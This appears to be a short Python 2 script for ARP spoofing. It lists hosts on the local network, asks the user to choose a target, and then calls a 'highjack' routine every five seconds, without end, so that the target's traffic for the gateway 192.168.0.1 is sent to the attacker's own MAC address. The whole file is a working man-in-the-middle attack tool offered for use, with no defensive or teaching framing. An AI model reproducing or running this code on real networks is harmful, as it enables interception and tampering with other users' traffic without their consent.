'''
Created on 29.09.2016

@author: maxbit89
'''

import argparse
import hacktile.arp.ArpUtils as ArpUtils
import time

def clear():
    print(chr(27) + "[2J")
    
def printArpTable(arps):
    for arpid in range(0, len(arps)):
        print "%03i | %-40s | %-15s |" % (arpid, arps[arpid]["vendor"], arps[arpid]["IP address"])
    

parserArgs = argparse.ArgumentParser(description='Redirect Traffic From IP')

parserArgs.add_argument('-dev', required=True, dest='dev',
                        help='Linux Ethernet device that should be used e.g. /dev/eth0')

args = parserArgs.parse_args()  

print 
print args.dev  

arpHack = ArpUtils.arputils(args.dev)
arps = arpHack.getArp()

printArpTable(arps)
id_attack = int(raw_input())
ownMac = arpHack.getOwnMac()
print "Redirect from Target [%s::%s] to %s" % (arps[id_attack]["HW address"], arps[id_attack]["IP address"], ownMac)
while True:
    arpHack.highjack("192.168.0.1", ownMac, arps[id_attack]["HW address"])
    time.sleep(5)